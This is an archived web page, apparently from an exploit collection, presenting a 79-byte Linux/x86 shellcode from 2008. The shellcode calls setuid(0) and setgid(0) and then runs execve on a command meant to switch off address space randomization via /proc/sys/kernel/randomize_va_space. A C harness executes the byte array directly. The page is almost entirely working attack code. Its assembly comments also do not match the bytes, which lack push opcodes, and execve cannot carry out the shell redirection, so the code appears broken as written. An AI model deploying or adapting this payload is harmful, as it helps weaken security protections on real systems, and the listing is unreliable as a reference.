<html><head><title>Linux/x86 - setuid(0) + setgid(0) + execve(echo 0 &gt; /proc/sys/kernel/randomize_va_space)  - 79 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Linux/x86 (Fedora 8) setuid(0) + setgid(0) + execve(&quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;) 
 *
 * by LiquidWorm
 * 
 * 2008 (c) www.zeroscience.org
 *
 * liquidworm [at] gmail.com
 *
 * 79 bytes.
 * 
 */


char sc[] =

  &quot;\x6a\x17&quot;			// push	$0x17
  &quot;\x58&quot;			// pop 	%eax
  &quot;\x31\xdb&quot;			// xor	%ebx, %ebx
  &quot;\xcd\x80&quot;			// int	$0x80
  &quot;\x6a\x2e&quot;			// push	$0x2e
  &quot;\x58&quot;			// pop	%eax
  &quot;\x53&quot;			// push %ebx
  &quot;\xcd\x80&quot;			// int	$0x80
  &quot;\x31\xd2&quot;			// xor	%edx, %edx
  &quot;\x6a\x0b&quot;			// push	$0xb
  &quot;\x58&quot;			// pop	%eax
  &quot;\x52&quot;			// push	%edx
  &quot;\x70\x61\x63\x65&quot;            // push $0x65636170
  &quot;\x76\x61\x5f\x73&quot;            // push $0x735f6176
  &quot;\x69\x7a\x65\x5f&quot;            // push $0x5f657a69
  &quot;\x6e\x64\x6f\x6d&quot;            // push $0x6d6f646e
  &quot;\x6c\x2f\x72\x61&quot;            // push $0x61722f6c
  &quot;\x65\x72\x6e\x65&quot;            // push $0x656e7265
  &quot;\x73\x2f\x2f\x6b&quot;            // push $0x6b2f2f73
  &quot;\x2f\x2f\x73\x79&quot;            // push $0x79732f2f
  &quot;\x70\x72\x6f\x63&quot;            // push $0x636f7270
  &quot;\x20\x3e\x20\x2f&quot;            // push $0x2f203e20
  &quot;\x68\x6f\x20\x30&quot;            // push $0x30206f68
  &quot;\x2f\x2f\x65\x63&quot;            // push $0x63652f2f
  &quot;\x2f\x62\x69\x6e&quot;            // push $0x6e69622f
  &quot;\x89\xe3&quot;			// mov	%esp, %ebx
  &quot;\x52&quot;			// push	%edx
  &quot;\x53&quot;			// push	%ebx
  &quot;\x89\xe1&quot;			// mov	%esp, %ecx
  &quot;\xcd\x80&quot;;			// int	$0x80
 
int main()
{
	int (*fp)() = (int(*)())sc;
    	printf(&quot;bytes: %u\n&quot;, strlen(sc));
    	fp();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
